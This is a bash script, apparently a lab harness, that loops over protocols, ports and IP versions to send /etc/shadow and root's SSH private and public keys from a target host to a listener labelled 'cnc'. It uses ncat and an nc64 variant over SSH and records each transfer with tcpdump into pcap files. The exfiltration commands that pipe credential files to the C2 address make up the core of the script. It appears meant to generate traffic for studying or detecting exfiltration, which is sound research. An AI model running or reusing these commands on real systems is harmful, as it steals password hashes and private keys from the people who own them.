#!/bin/bash

cnc='10.0.242.194'
host='10.0.242.193'

files=( '/etc/shadow' '/root/.ssh/id_rsa' '/root/.ssh/id_rsa.pub' )
ports=( '53' '22' '80' '443' )
proto=( 't' 'u' )
ipver=( '4' '6' )

cnc_4='192.168.12.12'
cnc_6='2a02:1010:12::12'

cnc_ssh_port='2022'

working_dir='/tmp'
#working_dir='/var/pcap/experiments'

# untested and not used in this script
nc64 () {
	case $ver in
		4)
		nc_ver_arg="--ip_version_select 4"
		;;
		6)
		nc_ver_arg="--ip_version_select 6"
		;;
		64)
		nc_ver_arg=""
		;;
		*)
		nc_ver_arg=""
		;;
	esac	

	for file in "${files[@]}"; do
		echo "starting listener on port $port with protocol -$protocol on version $ver"
		ssh root@$cnc "/root/nc64-master/nc64.py -l -$protocol -p $port >> /tmp/nc64.log &" || echo fail
		sleep 2

		echo "attempting file transfer $file on port $port with protocol -$protocol on version $ver"
		ssh root@$host "cat $file | /root/nc64/nc64-master/nc64.py -h4 $cnc_4 -h6 $cnc_6 -$protocol -p $port $nc_ver_arg " || echo fail
		sleep 1

		echo "attempting to kill listener"
		ssh root@$cnc "pkill -9 nc64.py" || echo fail
		sleep 2

	done
}
netcat () {

	case $ver in
		4)
		dest_ip="$cnc_4"
		;;
		6)
		dest_ip="$cnc_6"
		;;
		*)
		echo "Anomaly in $ver"
		dest_ip="$cnc_4"
		;;
	esac	

	for file in "${files[@]}"; do

		cmd="ncat -$ver -$protocol -w 3 -lp $port --output /tmp/netcat.log"
		echo "starting listener on port $port with protocol -$protocol on version $ver"
		echo "command is:"
		echo "$cmd"
		ssh -p $cnc_ssh_port root@$cnc screen -m -d "$cmd" || echo fail
		sleep 2

		cmd="cat $file | ncat -w 3 $dest_ip -$protocol $port"
		echo "attempting file transfer $file on port $port with protocol -$protocol on version $ver"
		echo "command is:"
		echo "$cmd"
		ssh root@$host "$cmd" || echo fail
		sleep 2

		echo "attempting to kill listener"
		ssh -p $cnc_ssh_port root@$cnc "pkill -9 ncat" || echo fail
		sleep 2

	done
}

start_tcpdump_listener () {
	echo "starting tcpdump for $ver-$protocol-$port.pcap"
	tcpdump -i eth2 -w $working_dir/netcat-$ver-$protocol-$port.pcap > /dev/null &
	echo "sleeping after sending data"
}

kill_tcpdump_listener () {
	echo "killing tcpdump"
	pkill tcpdump
	sleep 2
}

for protocol in "${proto[@]}"; do
	echo "Initiating protocol $protocol test"
	for port in "${ports[@]}"; do
		echo "Initiating port $port test"
		for ver in "${ipver[@]}"; do
			echo "Initiating IP version $ver test"
			start_tcpdump_listener
			sleep 1

			echo "Initiating test sequence"
			netcat
			
			kill_tcpdump_listener

		done
	done
done
